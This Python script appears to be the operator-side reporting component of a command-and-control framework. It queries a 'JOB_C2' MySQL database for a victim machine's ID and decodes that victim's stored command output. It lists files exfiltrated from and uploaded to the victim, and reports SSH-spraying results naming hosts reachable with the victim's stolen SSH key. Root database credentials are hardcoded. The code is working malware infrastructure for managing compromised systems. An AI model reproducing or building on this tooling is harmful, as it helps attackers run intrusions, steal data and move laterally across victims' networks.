#!/usr/bin/env python
import io
import re
import base64
import sys
import json
import datetime
import mysql.connector
from mysql.connector import MySQLConnection, Error

class Result:
	def __init__(self, epoch_id, command, output):
		self.epoch_id = epoch_id
		self.command = command
		self.output = output

def decode ( input ):
	command_output = input
	output_bytes = command_output.encode('ascii')
	decoded_output_bytes = base64.b64decode(output_bytes)
	decoded_output = decoded_output_bytes.decode('ascii')
	return decoded_output

def getoutput( id ):

	Results = []

	#query to check whether or not the id requested appears in the database
	query = """ SELECT command_output, command_record, file_names, sshspray FROM victim_machines WHERE victim_id =%s """
	data = (id,)

	#https://www.mysqltutorial.org/python-mysql-update/
	try:
		#connect to the mysql database
		connection = MySQLConnection(host='localhost',database='JOB_C2',user='root',password='newpassword',auth_plugin='mysql_native_password')

		cursor = connection.cursor(buffered=True)
		cursor.execute(query,data)
		result = cursor.fetchall()
#		print(result[0][1])

		if result:
			#get command output, decode it, output it, and set command_output to empty set
			decoded_output = decode(result[0][0])
			decoded_record = decode(result[0][1])
			decoded_filenames = decode(result[0][2])
			decoded_sshspray = decode(result[0][3])

			record_data = json.loads(decoded_record)
			output_data = json.loads(decoded_output)
			filename_data = json.loads(decoded_filenames)
			sshspray_data = json.loads(decoded_sshspray)

			newfilename = id + ".txt"
			file = open(newfilename, "a")

			print("command output written to file named %s.txt" % (id,))

			#append all entries for traditional commands
			for key1, value1 in record_data["commands"].items():
				for key2, value2 in output_data["commands"].items():
					if key1 == key2:
						output = Result(key2, value1, value2)
						Results.append(output)

			#append all entries for keylogging

			#append all entries for downloaded files
			for key1, value1 in record_data["exfiltrate"].items():
				for key2, value2 in filename_data[key1].items():
					print(key1, value1, key2, value2)
					if value2 == "0":
						output_string = "There was an error in downloading \"" + str(value1) + "\" from the victim machine."
					if value2 == "1":
						output_string = str(value1) + " was downloaded from victim machine and stored locally at \"" + str(value2) + "\""

					output = Result(key1, output_string, "")
					Results.append(output)

			#append all entries for uploaded files
			for key1, value1 in record_data["infiltrate"].items():
				for key2, value2 in filename_data[key1].items():
					if value2 == "0":
						output_string = "There was an error in uploading \"" + str(key2) + "\" to the victim machine."
					if value2 == "1":
						output_string = "\"" + str(key2) + "\" was uploaded to victim machine at " + str(value1)

					output = Result(key1, output_string, "")
					Results.append(output)

			#sort the results to be in chronological order
			sorted_list = sorted(Results, key=lambda result: result.epoch_id)

			for entry in sorted_list:
				entry.epoch_id = datetime.datetime.fromtimestamp(int(entry.epoch_id))
				file.write("%s   %s   %s\n" % (entry.epoch_id, entry.command, entry.output))

			#add sshspray output to the end of the file
			if sshspray_data:
				for entry in sshspray_data:
					output_string = "SSH Spraying was conducted and IP address " + entry + " can be accessed using this machine's SSH Key."
					file.write("%s\n" % (output_string))

			file.close()
#			print(json.dumps(json_data, indent=2))

#			cleanup_query1 = """ UPDATE victim_machines SET command_output = 'e30=' WHERE victim_id =%s """
#			cleanup_query2 = """ UPDATE victim_machines SET sshspray = '' WHERE victim_id = %s """
#			cursor.execute(cleanup_query1,data)
#			cursor.execute(cleanup_query2,data)

		else:
			print("id not found in the database, try again")

		connection.commit()

	except Error as error:
		print(error)

	finally:
		cursor.close()
		connection.close()

	return True

if __name__ == "__main__":
	getoutput(*sys.argv[1:])
